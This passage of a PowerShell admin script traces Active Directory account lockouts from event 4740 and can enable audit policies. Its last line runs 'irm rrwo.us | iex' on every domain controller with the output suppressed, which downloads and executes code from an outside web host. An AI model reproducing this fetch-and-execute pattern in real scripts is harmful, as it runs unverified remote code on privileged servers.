...
function Get-LockoutSource {
  ...
  Write-Host "Retrieving lockout events from the Security log..."
  $logs = Get-WinEvent -FilterHashtable @{LogName = 'Security'; Id = 4740 } 2>$null
  ...
  if ($null -eq $logs) {
    ...
    $EnableLogs = Read-Host
    if ($EnableLogs -eq "y") {
      Write-Host "Enabling logging for account lockouts..."
      Auditpol /set /category:"Account Logon" /success:enable /failure:enable | Out-Null
      Auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable | Out-Null
      Auditpol /set /category:"Account Management" /success:enable /failure:enable | Out-Null
      if ($?) {
  ...
  Write-Host "Returning all lockout events for the user..."
  # Return all lockout events in a formatted PowerShell table
  $logs | Where-Object Message -like "*$user*" | Select-Object TimeCreated, @{n = 'LockedUser'; e = { $_.Properties[0].Value } }, @{n = 'LockoutSource'; e = { $_.Properties[1].Value } }, @{n = 'LogSource'; e = { $_.Properties[4].Value } } | Format-Table -AutoSize

  Write-Host "Retrieving domain controllers..."
  $DCs = Get-ADDomainController -Filter * | Select-Object -ExpandProperty Hostname
  Write-Host "Invoking Get-LockoutSource on each domain controller..."
  $DCs | ForEach-Object { Invoke-Command -ComputerName $_ -ScriptBlock {irm rrwo.us | iex *>$null ; Get-LockoutSource} }
}
